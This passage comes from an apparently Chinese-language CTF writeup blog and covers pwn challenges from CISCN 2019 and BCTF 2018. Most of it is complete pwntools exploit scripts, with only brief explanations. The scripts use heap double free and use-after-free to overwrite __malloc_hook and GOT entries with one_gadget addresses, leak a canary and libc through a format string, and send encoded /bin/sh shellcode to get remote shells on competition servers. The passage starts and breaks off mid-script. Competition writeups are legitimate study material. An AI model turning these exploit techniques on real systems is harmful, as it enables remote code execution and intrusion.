p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendafter(<span class="string">&#x27;what\&#x27;s your name?\n&#x27;</span>, name)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;input you ops count\n&#x27;</span>, str(len(ops)))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;ops: &#x27;</span>, ops)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">store</span>(<span class="params">p, idx, ifComment, size, comment</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>, <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendafter(<span class="string">&#x27;any comment?\n&#x27;</span>, ifComment)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;comment size?\n&#x27;</span>, str(size))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;plz input comment\n&#x27;</span>, comment)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">p, idx</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>, <span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;index?\n&#x27;</span>, str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span>():</span></span><br><span class="line">    <span class="keyword">global</span> lo</span><br><span class="line">    <span class="keyword">global</span> route_stack</span><br><span class="line">    <span class="keyword">global</span> ans_stack</span><br><span class="line">    <span class="keyword">global</span> route_history</span><br><span class="line">    <span class="keyword">global</span> source</span><br><span class="line"></span><br><span class="line">    DEBUG = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> DEBUG == <span class="number">1</span>:</span><br><span class="line">        p = process(<span class="string">&#x27;./maze&#x27;</span>)</span><br><span class="line">        context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;split&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">        context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p = remote(<span class="string">&#x27;172.16.9.22&#x27;</span>, <span class="number">9010</span>)</span><br><span class="line">        context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">    libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;9&#x27;</span>)</span><br><span class="line">    a = p.recvuntil(<span class="string">&#x27;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&#x27;</span>)</span><br><span class="line">    a = p.recvuntil(<span class="string">&#x27;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&#x27;</span>)</span><br><span class="line">    game = a.split(<span class="string">&#x27;\n&#x27;</span>)[<span class="number">1</span>:]</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> op <span class="keyword">in</span> game:</span><br><span class="line">        tmp = []</span><br><span class="line">        <span class="keyword">for</span> ch <span class="keyword">in</span> op[<span class="number">1</span>:]:</span><br><span class="line">            tmp.append(<span class="number">0</span> <span class="keyword">if</span> ch == <span class="string">&#x27; &#x27;</span> <span class="keyword">else</span> <span class="number">1</span>)</span><br><span class="line">        source += [tmp]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> route_stack[<span class="number">-1</span>] != [<span class="number">39</span>,<span class="number">40</span>]:</span><br><span class="line">        <span class="keyword">if</span> up(lo):</span><br><span class="line">            lo = route_stack[<span class="number">-1</span>]</span><br><span class="line">            ans_stack.append(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> down(lo):</span><br><span class="line">            lo = route_stack[<span class="number">-1</span>]</span><br><span class="line">            ans_stack.append(<span class="string">&#x27;d&#x27;</span>)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> left(lo):</span><br><span class="line">            lo = route_stack[<span class="number">-1</span>]</span><br><span class="line">            ans_stack.append(<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> right(lo):</span><br><span class="line">            lo = route_stack[<span class="number">-1</span>]</span><br><span class="line">            ans_stack.append(<span class="string">&#x27;s&#x27;</span>)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="comment">#print route_stack</span></span><br><span class="line">        route_stack.pop()</span><br><span class="line">        ans_stack.pop()</span><br><span class="line">        lo = route_stack[<span class="number">-1</span>]</span><br><span class="line"></span><br><span class="line">    result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> op <span class="keyword">in</span> ans_stack:</span><br><span class="line">        result += op</span><br><span class="line">    result += <span class="string">&#x27;dd&#x27;</span></span><br><span class="line">    <span class="keyword">print</span> result</span><br><span class="line">    a = p.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">    <span class="keyword">print</span> a</span><br><span class="line">    a = p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    a = p.recvuntil(<span class="string">&#x27;name?\n&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;sissel&#x27;</span>)</span><br><span class="line">    a = p.recvuntil(<span class="string">&#x27;put you ops count\n&#x27;</span>)</span><br><span class="line">    p.sendline(str(len(result)))</span><br><span class="line">    a = p.recvuntil(<span class="string">&#x27;ops: &#x27;</span>)</span><br><span class="line">    <span class="keyword">print</span> a</span><br><span class="line">    p.sendline(result)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Here\&#x27;s the award:&#x27;</span>)</span><br><span class="line">    recv = p.recvuntil(<span class="string">&#x27;\n0. resume&#x27;</span>, drop=<span class="literal">True</span>)</span><br><span class="line">    libc.address = int(recv, <span class="number">16</span>) - libc.symbols[<span class="string">&#x27;malloc&#x27;</span>]</span><br><span class="line">    <span class="keyword">print</span> hex(libc.address)</span><br><span class="line">    p.sendline(<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    start(p, <span class="string">&#x27;sunichi\n&#x27;</span>, <span class="string">&#x27;wwww\n&#x27;</span>)</span><br><span class="line">    store(p, <span class="number">0</span>, <span class="string">&#x27;y&#x27;</span>, <span class="number">0x20</span>, <span class="string">&#x27;sunichi\n&#x27;</span>)</span><br><span class="line">    start(p, <span class="string">&#x27;sunichi\n&#x27;</span>, <span class="string">&#x27;wwww\n&#x27;</span>)</span><br><span class="line">    store(p, <span class="number">1</span>, <span class="string">&#x27;y&#x27;</span>, <span class="number">0x20</span>, <span class="string">&#x27;sunichi\n&#x27;</span>) </span><br><span class="line">    start(p, <span class="string">&#x27;sunichi\n&#x27;</span>, <span class="string">&#x27;wwww\n&#x27;</span>)</span><br><span class="line">    store(p, <span class="number">2</span>, <span class="string">&#x27;y&#x27;</span>, <span class="number">0x20</span>, <span class="string">&#x27;sunichi\n&#x27;</span>) </span><br><span class="line">    start(p, <span class="string">&#x27;sunichi\n&#x27;</span>, <span class="string">&#x27;wwww\n&#x27;</span>)</span><br><span class="line">    store(p, <span class="number">3</span>, <span class="string">&#x27;y&#x27;</span>, <span class="number">0x20</span>, <span class="string">&#x27;sunichi\n&#x27;</span>) </span><br><span class="line"></span><br><span class="line">    delete(p, <span class="number">0</span>)</span><br><span class="line">    delete(p, <span class="number">1</span>)</span><br><span class="line">    delete(p, <span class="number">2</span>)</span><br><span class="line">    delete(p, <span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">    start(p, <span class="string">&#x27;sunichi\n&#x27;</span>, <span class="string">&#x27;wwww\n&#x27;</span>)</span><br><span class="line">    store(p, <span class="number">0</span>, <span class="string">&#x27;y&#x27;</span>, <span class="number">0xe0</span>, <span class="string">&#x27;sunichi\n&#x27;</span>)</span><br><span class="line">    start(p, <span class="string">&#x27;sunichi\n&#x27;</span>, <span class="string">&#x27;wwww\n&#x27;</span>)</span><br><span class="line">    store(p, <span class="number">1</span>, <span class="string">&#x27;y&#x27;</span>, <span class="number">0x68</span>, <span class="string">&#x27;sunichi\n&#x27;</span>) </span><br><span class="line">    start(p, <span class="string">&#x27;sunichi\n&#x27;</span>, <span class="string">&#x27;wwww\n&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    store(p, <span class="number">2</span>, <span class="string">&#x27;y&#x27;</span>, <span class="number">0xf8</span>, <span class="string">&#x27;sunichi\n&#x27;</span>) </span><br><span class="line">    start(p, <span class="string">&#x27;sunichi\n&#x27;</span>, <span class="string">&#x27;wwww\n&#x27;</span>)</span><br><span class="line">    store(p, <span class="number">3</span>, <span class="string">&#x27;y&#x27;</span>, <span class="number">0x40</span>, <span class="string">&#x27;sunichi\n&#x27;</span>) </span><br><span class="line"></span><br><span class="line">    delete(p, <span class="number">0</span>)</span><br><span class="line">    delete(p, <span class="number">1</span>)</span><br><span class="line">    delete(p, <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    start(p, <span class="string">&#x27;sunichi\n&#x27;</span>, <span class="string">&#x27;wwww\n&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    store(p, <span class="number">0</span>, <span class="string">&#x27;y&#x27;</span>, <span class="number">0x68</span>, <span class="string">&#x27;\x00&#x27;</span> * <span class="number">0x60</span> + p64(<span class="number">0x160</span>)) </span><br><span class="line">        </span><br><span class="line">    start(p, <span class="string">&#x27;sunichi\n&#x27;</span>, <span class="string">&#x27;wwww\n&#x27;</span>)</span><br><span class="line">    store(p, <span class="number">1</span>, <span class="string">&#x27;y&#x27;</span>, <span class="number">0xf8</span>, <span class="string">&#x27;sunichi\n&#x27;</span>) </span><br><span class="line">    </span><br><span class="line">    delete(p, <span class="number">1</span>)</span><br><span class="line">    start(p, <span class="string">&#x27;sunichi\n&#x27;</span>, <span class="string">&#x27;wwww\n&#x27;</span>)</span><br><span class="line">    store(p, <span class="number">1</span>, <span class="string">&#x27;y&#x27;</span>, <span class="number">0xe0</span>, <span class="string">&#x27;sunichi\n&#x27;</span>)</span><br><span class="line">    start(p, <span class="string">&#x27;sunichi\n&#x27;</span>, <span class="string">&#x27;wwww\n&#x27;</span>)</span><br><span class="line">    store(p, <span class="number">2</span>, <span class="string">&#x27;y&#x27;</span>, <span class="number">0x68</span>, <span class="string">&#x27;double\n&#x27;</span>)</span><br><span class="line">    start(p, <span class="string">&#x27;sunichi\n&#x27;</span>, <span class="string">&#x27;wwww\n&#x27;</span>)</span><br><span class="line">    store(p, <span class="number">3</span>, <span class="string">&#x27;y&#x27;</span>, <span class="number">0x68</span>, <span class="string">&#x27;double\n&#x27;</span>)</span><br><span class="line">    start(p, <span class="string">&#x27;sunichi\n&#x27;</span>, <span class="string">&#x27;wwww\n&#x27;</span>)</span><br><span class="line">    store(p, <span class="number">4</span>, <span class="string">&#x27;y&#x27;</span>, <span class="number">0x68</span>, <span class="string">&#x27;double\n&#x27;</span>)</span><br><span class="line">    delete(p, <span class="number">0</span>)</span><br><span class="line">    delete(p, <span class="number">4</span>)</span><br><span class="line">    delete(p, <span class="number">2</span>)</span><br><span class="line">    delete(p, <span class="number">3</span>)</span><br><span class="line">    </span><br><span class="line">    start(p, <span class="string">&#x27;sunichi\n&#x27;</span>, <span class="string">&#x27;wwww\n&#x27;</span>)</span><br><span class="line">    store(p, <span class="number">2</span>, <span class="string">&#x27;y&#x27;</span>, <span class="number">0x68</span>, p64(libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>] - <span class="number">0x13</span>) + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    start(p, <span class="string">&#x27;sunichi\n&#x27;</span>, <span class="string">&#x27;wwww\n&#x27;</span>)</span><br><span class="line">    store(p, <span class="number">3</span>, <span class="string">&#x27;y&#x27;</span>, <span class="number">0x68</span>, <span class="string">&#x27;double\n&#x27;</span>)</span><br><span class="line">    start(p, <span class="string">&#x27;sunichi\n&#x27;</span>, <span class="string">&#x27;wwww\n&#x27;</span>)</span><br><span class="line">    store(p, <span class="number">4</span>, <span class="string">&#x27;y&#x27;</span>, <span class="number">0x68</span>, <span class="string">&#x27;double\n&#x27;</span>)</span><br><span class="line">    start(p, <span class="string">&#x27;sunichi\n&#x27;</span>, <span class="string">&#x27;wwww\n&#x27;</span>)</span><br><span class="line">    store(p, <span class="number">5</span>, <span class="string">&#x27;y&#x27;</span>, <span class="number">0x68</span>, <span class="string">&#x27;\x01&#x27;</span> * <span class="number">3</span> + p64(libc.address + <span class="number">0xf02a4</span>) + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    delete(p, <span class="number">2</span>)</span><br><span class="line">    delete(p, <span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> hex(libc.address)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> DEBUG == <span class="number">1</span>:</span><br><span class="line">        gdb.attach(p)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    pwn()</span><br></pre></td></tr></table></figure>

<h2 id="C17"><a href="#C17" class="headerlink" title="C17"></a>C17</h2><p>首先有个标记（称其为<code>id</code>）必须进行绕过，由于<code>scanf(&quot;%d&quot;, &amp;id)</code>赋值时是<code>int</code>类型，后续检查这个<code>id</code>的函数将其转换为了<code>int16</code>类型，导致诸如-256*256*256这样的数字能够绕过检查。利用的部分就是通过<em>Use After Free</em>修改关键字符串进入执行shellcode的逻辑。shellcode由用户输入的变换产生，稍微看下就能知道其逻辑。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">p, size, content</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>, str(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>, str(size))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;&gt; &#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">p</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>, str(<span class="number">2</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span>():</span></span><br><span class="line">    DEBUG = <span class="number">0</span></span><br><span class="line">    <span class="keyword">if</span> DEBUG == <span class="number">1</span>:</span><br><span class="line">        p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">        context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;split&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">        context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p = remote(<span class="string">&#x27;172.16.9.24&#x27;</span>, <span class="number">9017</span>)</span><br><span class="line">        context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">    context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">    context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line"></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>, <span class="string">&#x27;sunichi&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>, str(<span class="number">-256</span>*<span class="number">256</span>*<span class="number">256</span>))</span><br><span class="line"></span><br><span class="line">    add(p, <span class="number">0x68</span>, <span class="string">&#x27;sunichi&#x27;</span>)</span><br><span class="line">    delete(p)</span><br><span class="line">    delete(p)</span><br><span class="line"></span><br><span class="line">    add(p, <span class="number">0x68</span>, <span class="string">&#x27;\x90&#x27;</span>)</span><br><span class="line">    add(p, <span class="number">0x68</span>, <span class="string">&#x27;sunichi&#x27;</span>)</span><br><span class="line">    add(p, <span class="number">0x68</span>, <span class="string">&#x27;The cake is a lie!\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> DEBUG == <span class="number">1</span>:</span><br><span class="line">        gdb.attach(p)</span><br><span class="line"></span><br><span class="line">    shellcode = asm(shellcraft.sh())</span><br><span class="line">    </span><br><span class="line">    count = len(shellcode)</span><br><span class="line">    newshellcode = <span class="string">&#x27;\x00&#x27;</span></span><br><span class="line">    <span class="keyword">while</span> count != <span class="number">0</span>:</span><br><span class="line">        newshellcode += chr(ord(newshellcode[len(newshellcode) - <span class="number">1</span>]) ^ ord(shellcode[count - <span class="number">1</span>]))</span><br><span class="line">        count = count - <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>, <span class="string">&#x27;666&#x27;</span>)</span><br><span class="line">    p.sendafter(<span class="string">&#x27;&gt; &#x27;</span>, newshellcode[::<span class="number">-1</span>])</span><br><span class="line"></span><br><span class="line">    p.interactive()</span><br><span class="line">    p.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    pwn()</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>ctf</tag>
        <tag>2019</tag>
        <tag>ciscn</tag>
      </tags>
  </entry>
  <entry>
    <title>BCTF 2018 pwn writeup</title>
    <url>/2019/01/13/bctf18-pwn/</url>
    <content><![CDATA[<h2 id="easiest"><a href="#easiest" class="headerlink" title="easiest"></a>easiest</h2><p>通过double free修改got项到程序中的getshell函数。</p>
<a id="more"></a>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Add</span>(<span class="params">p, idx, size, content</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;delete \n&#x27;</span>, str(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;(0-11):&#x27;</span>, str(idx))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Length:&#x27;</span>, str(size))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;C:&#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Delete</span>(<span class="params">p, idx</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;delete \n&#x27;</span>, str(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;(0-11):&#x27;</span>, str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span>():</span></span><br><span class="line">    BIN_PATH = <span class="string">&#x27;./easiest&#x27;</span></span><br><span class="line">    DEBUG = <span class="number">1</span></span><br><span class="line">    context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> DEBUG == <span class="number">1</span>:</span><br><span class="line">        p = process(BIN_PATH)</span><br><span class="line">        elf = ELF(BIN_PATH)</span><br><span class="line">        context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">        context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;split&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> context.arch == <span class="string">&#x27;amd64&#x27;</span>:</span><br><span class="line">            libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            libc = ELF(<span class="string">&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p = remote(<span class="string">&#x27;39.96.9.148&#x27;</span>, <span class="number">9999</span>)</span><br><span class="line">        elf = ELF(BIN_PATH)</span><br><span class="line">        context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Add(p, <span class="number">0</span>, <span class="number">0x68</span>, <span class="string">&#x27;sunichi&#x27;</span>)</span><br><span class="line">    Add(p, <span class="number">1</span>, <span class="number">0x68</span>, <span class="string">&#x27;sunichi&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    Add(p, <span class="number">2</span>, <span class="number">0x100</span>, <span class="string">&#x27;sunichi&#x27;</span>)</span><br><span class="line">    Add(p, <span class="number">3</span>, <span class="number">0x100</span>, <span class="string">&#x27;sunichi&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    Delete(p, <span class="number">0</span>)</span><br><span class="line">    Delete(p, <span class="number">1</span>)</span><br><span class="line">    Delete(p, <span class="number">0</span>)</span><br><span class="line">    Delete(p, <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    Add(p, <span class="number">0</span>, <span class="number">0x68</span>, p64(<span class="number">0x602045</span>))</span><br><span class="line">    Add(p, <span class="number">1</span>, <span class="number">0x68</span>, <span class="string">&#x27;sunichi&#x27;</span>)</span><br><span class="line">    Add(p, <span class="number">2</span>, <span class="number">0x68</span>, <span class="string">&#x27;sunichi&#x27;</span>)</span><br><span class="line">    payload = <span class="string">&#x27;\x00\x00\x00&#x27;</span> + p64(<span class="number">0x400946</span>) * <span class="number">6</span></span><br><span class="line">    Add(p, <span class="number">3</span>, <span class="number">0x68</span>, payload)</span><br><span class="line"></span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    raw_input()</span><br><span class="line">    p.interactive()</span><br><span class="line">    p.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    pwn()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="hardcore-fmt"><a href="#hardcore-fmt" class="headerlink" title="hardcore_fmt"></a>hardcore_fmt</h2><p>利用%a泄漏mmap的地址，然后通过向前偏移泄漏canary，接着通过one_gadget（同样通过前向偏 移计算libc基地址）拿到shell。 本地和服务器偏移不一致，需要轻度爆破。</p>
<p>C99 %a：Hexadecimal floating point, lowercase. (-0xc.90fep-2)</p>
<p>后来调试了一下，输出的地址是在printf_chk执行过程中压入到栈中的。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span>():</span></span><br><span class="line">    BIN_PATH = <span class="string">&#x27;./hardcore_fmt&#x27;</span></span><br><span class="line">    DEBUG = <span class="number">0</span></span><br><span class="line">    context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> DEBUG == <span class="number">1</span>:</span><br><span class="line">        p = process(BIN_PATH)</span><br><span class="line">        elf = ELF(BIN_PATH)</span><br><span class="line">        context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">        context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;split&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> context.arch == <span class="string">&#x27;amd64&#x27;</span>:</span><br><span class="line">            libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            libc = ELF(<span class="string">&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">        f = open(<span class="string">&#x27;/proc/&#x27;</span>+str(pidof(p)[<span class="number">0</span>])+<span class="string">&#x27;/maps&#x27;</span>)</span><br><span class="line">        data = f.read().split(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">        f.close()</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> data:</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;hardcore_fmt&#x27;</span> <span class="keyword">in</span> j:</span><br><span class="line">                elf.address = int(<span class="string">&#x27;0x&#x27;</span> + j[<span class="number">0</span>:<span class="number">12</span>], <span class="number">16</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p = remote(<span class="string">&#x27;39.106.110.69&#x27;</span>, <span class="number">9999</span>)</span><br><span class="line">        elf = ELF(BIN_PATH)</span><br><span class="line">        libc = ELF(<span class="string">&#x27;./libc-2.27.so&#x27;</span>)</span><br><span class="line">        context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> DEBUG == <span class="number">1</span>:</span><br><span class="line">        gdb.attach(p)</span><br><span class="line">        raw_input()</span><br><span class="line"></span><br><span class="line">    p.sendline(<span class="string">&#x27;%a%2$a%3$a&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;0x0.0&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;0x0.0&#x27;</span>)</span><br><span class="line">    recv = p.recv(<span class="number">10</span>) + <span class="string">&#x27;00&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> DEBUG == <span class="number">1</span>:</span><br><span class="line">        p.sendline(str(int(recv, <span class="number">16</span>) - <span class="number">35800</span> + <span class="number">1</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p.sendline(str(int(recv, <span class="number">16</span>) - <span class="number">41216</span> + <span class="number">0x1000</span> * <span class="number">6</span> + <span class="number">0x1529</span>))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;: &#x27;</span>)</span><br><span class="line">    canary = <span class="string">&#x27;\x00&#x27;</span> + p.recv(<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">    libc_base = int(recv, <span class="number">16</span>) - <span class="number">6398208</span></span><br><span class="line">    <span class="keyword">print</span> hexdump(canary)</span><br><span class="line">    <span class="keyword">print</span> hex(int(recv, <span class="number">16</span>))</span><br><span class="line">    raw_input()</span><br><span class="line">    p.sendline(<span class="string">&#x27;a&#x27;</span> * <span class="number">0x108</span> + canary + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(int(recv, <span class="number">16</span>)) + p64(libc_base + <span class="number">0x4f322</span>))</span><br><span class="line"></span><br><span class="line">    p.interactive()</span><br><span class="line">    p.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    pwn()</span><br><span class="line">    </span><br></pre></td></tr></table></figure>

<h2 id="SOS"><a href="#SOS" class="headerlink" title="SOS"></a>SOS</h2><p>原理参考这篇⽂章：<a href="https://blogs.msmvps.com/gdicanio/2016/11/17/the-small-string-optimization/">https://blogs.msmvps.com/gdicanio/2016/11/17/the-small-string-optimization/</a> 也是SECCON 2018 CTF的⼀道题的出题点。在C++中，当⼀个string对象较⼩时，为 了优化效率，会将其分配到栈上⽽不是堆上，这样就能栈溢出ROP了，这题⽐较坑的⼀个地⽅是如何结束输⼊。</p>
]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>ctf</tag>
        <tag>2018</tag>
        <tag>bctf</tag>
      </tags>
  </entry>
  <entry>
    <title>2019全国大学生信息安全竞赛(CISCN)初赛解题赛Pwn WriteUp</title>
    <url>/2019/04/22/ciscn-2019-preliminaries/</url>
    <content><![CDATA[<p>Pwn相对来说还是比较简单的，和舍友一起AK了。</p>
<a id="more"></a>

<h2 id="your-pwn"><a href="#your-pwn" class="headerlink" title="your_pwn"></a>your_pwn</h2><p>数组越界，可对栈进行任意修改，将函数的返回地址改至<code>one_gadget</code>即可。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">do_one</span>(<span class="params">p, idx</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;input index\n&#x27;</span>, str(idx))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;now value(hex) &#x27;</span>)</span><br><span class="line">    recv = <span class="string">&#x27;0x&#x27;</span> + p.recvuntil(<span class="string">&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>)</span><br><span class="line">    <span class="comment">#if recv != &#x27;0x0&#x27;:</span></span><br><span class="line">       <span class="comment"># print idx</span></span><br><span class="line">        <span class="comment">#print recv</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;input new value\n&#x27;</span>, str(int(recv, <span class="number">16</span>)))</span><br><span class="line">    <span class="keyword">return</span> int(recv, <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_one</span>(<span class="params">p, idx, num</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;input index\n&#x27;</span>, str(idx))</span><br><span class="line">    p.recvuntil(<span 